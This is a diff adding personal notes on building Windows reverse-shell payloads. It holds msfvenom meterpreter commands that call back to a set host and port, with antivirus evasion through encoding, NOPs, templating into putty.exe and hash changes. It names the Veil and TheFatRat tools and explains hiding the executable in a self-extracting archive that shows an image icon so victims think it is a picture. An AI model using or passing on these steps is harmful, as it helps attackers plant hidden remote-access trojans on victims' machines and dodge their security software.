@@ -1,0 +1,71 @@
+Creating payloads 
+
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f exe -o shell0.exe
+    
+        use exploit/multi/handler -> to listen for incoming connection
+        set payload (the same one as used in msfveon windows/x64/meterpreter/reverse_tcp)
+        set host and ports 
+        run -> execute exe on windows
+
+    virustotal -> see how many antiviruses would catch the payload
+
+    to bypass some antiviruses use: 
+        encoding, encoding iterations, add nops...
+        for example: 
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f exe -a x64  -e x64/zutto_dekiru -i 15 --platform windows -n 500 -o shell0.exe
+
+        templateing (as putty)
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -x putty.exe -f exe -o Putty.exe
+
+
+        changing formats
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f python -o payload.py (should be FUD, the problem is running)
+
+        best -> implement your own payloads in a unique way
+
+    using Veil
+        sudo apt install Veil
+        run it -> will install deps (when running for the first time)
+
+        its pretty easy to use, very similar to msfconsole 
+
+        generates .bat files -> convert to exe using https://github.com/tokyoneon/B2E
+        also generates msfconsole resource that can be loaded to mfsconsole using resource keyword
+
+
+    using fatrat https://github.com/screetsec/TheFatRat
+        follow github readme for setup and installation
+        run sudo su before running it
+
+
+    changing payloads
+        changing binary file using hexeditor
+            lets see the hash of the current binary
+                md5sum shell0.exe 
+                ea553eb6c1f326a53ebc45d94cd77784  shell0.exe
+
+            lets change something... $ hexeditor shell0.exe
+
+            new hash:
+                md5sum shell0.exe   
+                c02a544615de60a2ab817f286b23d170  shell0.exe
+
+        to look like some different file (car image...)
+            I need a car image and the payload (exe) file
+            
+            convert png to ico (on google)
+
+            create SFX archive (zip) from .png and .exe 
+            under advanced sfx options use:
+                extract and update
+                override all files
+                add SFX icon
+                unpack to temp folder 
+                hide all 
+                under run after extraction add .exe and .png file names (correctly!)
+            (has .exe extention)
+
+
+        
+            
+
